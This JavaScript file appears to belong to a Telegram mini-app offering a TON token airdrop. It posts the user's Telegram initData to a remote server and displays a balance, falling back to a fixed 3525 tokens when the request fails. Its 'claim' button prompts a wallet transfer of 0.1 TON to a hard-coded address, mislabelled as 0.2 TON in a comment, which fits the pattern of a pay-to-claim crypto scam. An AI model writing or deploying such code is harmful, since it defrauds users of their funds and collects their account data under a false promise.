import * as Ton from "https://esm.sh/@ton/ton@latest";
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://raw.githubusercontent.com/hamstermod/StarJack.github.io/refs/heads/main/manifest.json',
    buttonRootId: 'ton-connect'
});
function parseQuery(query) {
    try{
        const params = new URLSearchParams(query);
        const result = {};

        for (const [key, value] of params.entries()) {
            result[key] = value;
        }

        if (result.user) {
            try {
                result.user = JSON.parse(decodeURIComponent(result.user));
            } catch (e) {
                createMessage(text.errorParsing + " " + e, 0);
                console.error("Ошибка при парсинге user JSON:", e);
            }
        }

        return result;
    }catch(el){
        return {user: {id: 1}};
    }
}
const search = Telegram.WebApp.initData;
const userUIdata = parseQuery(search);
async function getData(){
    let airdropCount = document.getElementById("airdropCount");
   try{
       const result = await fetch("https://server-production-98df.up.railway.app/user", {
           method: "POST",
           headers: {
               "accept": "*/*",
               "content-type": "application/json"
           },
           body: JSON.stringify({ initData: search}),
           mode: "cors"
       }).then((el) => el.json()).catch((e) => {airdropToken: 3525});
       document.getElementById("loading").classList.add("hide");
       airdropCount.innerText = result.airdropToken || 0;
   }catch(e) {
       airdropCount.innerText = 3525;
   }
}





document.getElementById("claimAirdropBtt").onclick = async () => {

    try{
        if (!tonConnectUI.wallet) {
            await tonConnectUI.openModal();
        }
        const message = `CLAIM AIRDROP (ID-${userUIdata.user.id})`
        const commentBody = Ton.beginCell()
            .storeUint(0, 32)
            .storeStringTail(message)
            .endCell();

        const payloadBoc = commentBody.toBoc();
        const base64Payload = btoa(String.fromCharCode(...payloadBoc));
       const transaction = {
    validUntil: Math.floor(Date.now() / 1000) + 300,
    messages: [
        {
            address: "UQCVM8miBrZr2wZ3fqHzZjpoK8wGbTM0hS25ZVN8cgAwuWkD",
            amount: '100000000', // 0.2 TON (in nanotons)
            payload: base64Payload
        }
    ]
}

async function sendTransaction() {
    const result = await tonConnectUI.sendTransaction(transaction);
    return result;
}

sendTransaction();
    }catch(e) {
    }
}

getData();

